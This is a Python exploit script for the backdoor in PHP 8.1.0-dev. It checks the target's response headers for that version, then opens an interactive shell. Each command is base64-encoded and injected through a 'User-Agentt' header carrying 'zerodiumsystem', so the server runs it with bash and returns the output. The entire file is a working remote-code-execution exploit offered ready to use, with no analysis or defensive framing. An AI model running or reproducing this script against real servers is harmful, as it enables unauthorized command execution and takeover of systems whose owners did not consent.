#!/usr/bin/python3

import requests
import sys
import re
import os
from base64 import b64encode

if len(sys.argv) != 2:
	print(f"Usage: python3 {sys.argv[0]} <url>")
	sys.exit(1)

main_url = sys.argv[1]
php = ''

def cmdToBase64(cmd):
	cmd = cmd.encode()
	cmd = b64encode(cmd).decode()
	return cmd

def makeRequest(cmd):
	headers = {
		"User-Agentt": f"zerodiumsystem('echo {cmd} | base64 -d | bash 2>&1');"
	}

	try:
		r = requests.get(main_url, headers=headers, allow_redirects=False)
		regex = re.findall("(?:.+\n)+<\!DOCTYPE", r.text, re.IGNORECASE)[0]
		print(regex[:-9])

	except IndexError:
		pass

if __name__ == '__main__':

	r = requests.get(main_url)
	if r.status_code != 200:
		print(f"Status Code: {r.status_code}, check the url.")
		sys.exit(1)

	for header in r.headers.items():
		if "PHP/8.1.0-dev" in header:
			print("[*] Found PHP/8.1.0-dev in header items")
			php = True
	if not php:
		print("[!] Not found PHP/8.1.0-dev in header items, exiting...")
		sys.exit(1)
		
	print("Type exit to exit the web shell\nType clear to clear the screen\nEnjoy it :3")
	while True:
		cmd = input("$ ")
		if cmd == "exit":
			sys.exit(0)

		if cmd == "clear":
			os.system('clear')
			continue

		cmd_ = cmdToBase64(cmd)
		makeRequest(cmd_)
